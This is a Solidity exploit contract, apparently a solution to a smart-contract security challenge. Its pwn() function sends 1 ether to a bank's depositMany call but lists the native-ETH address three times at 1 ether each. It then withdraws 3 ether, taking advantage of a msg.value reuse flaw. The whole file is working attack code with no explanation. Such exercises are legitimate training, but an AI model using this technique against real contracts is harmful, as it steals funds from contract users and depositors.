// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IMultiTokenBank {
    function balances(address, address) external view returns (uint);

    function depositMany(address[] calldata, uint[] calldata) external payable;

    function deposit(address, uint) external payable;

    function withdraw(address, uint) external;
}

contract MultiTokenBankExploit {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    IMultiTokenBank public bank;

    constructor(address _bank) {
        bank = IMultiTokenBank(_bank);
    }

    receive() external payable {}

    function pwn() external payable {
        // write your code here
        address[] memory tokens = new address[](3);
        tokens[0] = ETH;
        tokens[1] = ETH;
        tokens[2] = ETH;
        
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1 ether;
        amounts[1] = 1 ether;
        amounts[2] = 1 ether;
        
        bank.depositMany{value: 1 ether}(tokens, amounts);
        
        bank.withdraw(ETH, 3 ether);
    }
}